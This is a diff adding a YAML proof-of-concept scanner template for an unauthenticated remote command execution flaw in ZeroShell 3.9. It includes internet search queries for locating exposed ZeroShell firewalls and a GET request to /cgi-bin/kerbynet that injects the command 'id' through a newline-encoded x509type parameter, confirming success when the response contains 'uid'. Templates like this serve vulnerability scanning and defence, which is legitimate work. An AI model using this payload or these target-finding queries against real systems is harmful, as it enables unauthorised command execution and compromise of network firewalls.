@@ -1,0 +1,30 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="Zeroshell-防火墙"
+    hunter-query: app.name=="ZeroShell"
+    quake-query: app:"zeroshell"
+    zoomeye-query: app:"ZeroShell"
+    threatbook-query: #
+    cve: 
+    cnvd:
+
+name: poc-yaml-zeroshell-3.9-type-rce
+transport: http
+set:
+  s0: randomInt(1000,9999)
+  s1: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0Aid%0A%27
+      follow_redirects: false
+      headers:
+      body:
+    expression: >-
+      response.status == 200 && response.body_string.contains("uid")
+expression: r0() 
